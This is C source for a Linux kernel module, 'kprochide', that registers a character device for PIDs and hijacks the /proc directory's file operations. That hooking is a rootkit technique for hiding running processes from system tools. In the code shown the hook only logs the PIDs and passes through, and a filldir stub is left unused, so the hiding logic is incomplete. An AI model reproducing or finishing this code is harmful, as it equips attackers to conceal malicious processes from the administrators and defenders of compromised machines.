#include "readpid.h"

#include <linux/namei.h>
#include <linux/fcntl.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("spiderpig");
MODULE_VERSION("1.0.0");

// char device
static const char* readpid_chrdev_name = "kprochide_readpid";
static int readpid_chrdev_major_num;

struct file_operations procfs_fops;
struct file_operations *procfs_backup_fops;
struct inode *procfs_inode;

static void empty_pids_to_hide_list(void);
static void restore_procfs_fops_to_default(void);
static int override_procfs_fops(void);

static int kprochide_iterate_shared(struct file *file, struct dir_context *dir_ctx)
{
    struct pid_to_hide* pid_to_hide;

    list_for_each_entry(pid_to_hide, &kprochide_pids_to_hide, l_head) {
        printk(KERN_INFO "kprochide: pid=%d\n", pid_to_hide->pid);
    }

    return procfs_backup_fops->iterate_shared(file, dir_ctx);
}

static int kprochide_filldir(struct dir_context *ctx, 
                             const char *name, int namlen, 
                             loff_t offset, u64 ino, 
                             unsigned int d_type)
{   
    return 0;
}

static void empty_pids_to_hide_list()
{
    struct list_head * pos = NULL;
    struct list_head *tmp = NULL;
    struct pid_to_hide* pid;

    list_for_each_safe(pos, tmp, &kprochide_pids_to_hide) {
        pid = list_entry(pos, struct pid_to_hide, l_head);
        if (NULL == pid) {
            continue;
        }

        list_del(pos);
        kfree(pid);
    }
}

static int override_procfs_fops()
{
    struct path proc_path;
    if (kern_path("/proc", 0, &proc_path)) {
        return -EIO;
    }

    // save a copy of the procfs inode and file_operations
    procfs_inode = proc_path.dentry->d_inode;
    procfs_backup_fops = procfs_inode->i_fop;

    // replace procfs file_operations.iterate_shared with our function    
    procfs_fops = *procfs_inode->i_fop;
    procfs_fops.iterate_shared = &kprochide_iterate_shared;
    procfs_inode->i_fop = &procfs_fops;

    return 0;
}

static void restore_procfs_fops_to_default()
{
    struct path proc_path;
    if (kern_path("/proc", 0, &proc_path)) {
        printk(KERN_ERR "kprochide: kern_path failed while trying to open procfs.\n");
        return;
    }

    printk(KERN_INFO "kprochide: restoring procfs' original file_operations\n");
    procfs_inode = proc_path.dentry->d_inode;
    procfs_inode->i_fop = procfs_backup_fops;
}

static int __init mod_init(void)
{
    printk(KERN_INFO "kprochide: LKM loaded\n");
    readpid_chrdev_major_num = register_readpid_chrdev(readpid_chrdev_name);
    if (readpid_chrdev_major_num < 0) {
        printk(KERN_ERR "kprochide: failed to register char device (%d)\n", readpid_chrdev_major_num);
        return -EBUSY;
    }

    printk(KERN_INFO "kprochide: registered char device (%d)\n", readpid_chrdev_major_num);
    printk(KERN_INFO "kprochide: please run 'mknod /dev/readpid c %d 0'\n", readpid_chrdev_major_num);

    if (override_procfs_fops()) {
        printk(KERN_ERR "kprochide: kern_path failed to replace procfs' file_operations.\n");
        return -EIO;
    }

    printk(KERN_INFO "kprochide: successfully replaced procfs' file_operations\n");

    return 0;
}

static void __exit mod_exit(void)
{
    // restore procfs' file_operations to their default
    restore_procfs_fops_to_default();

    // empty the list of pids to hide and free all entries
    // NOTE: must be AFTER the restoration of the procfs' f_ops
    empty_pids_to_hide_list();
    
    // unregister character device
    unregister_readpid_chrdev(readpid_chrdev_major_num, readpid_chrdev_name);
    printk(KERN_INFO "kprochide: unregistered char device %d\n", readpid_chrdev_major_num);

    printk(KERN_INFO "kprochide: LKM successfully unloaded\n");
}

module_init(mod_init);
module_exit(mod_exit);
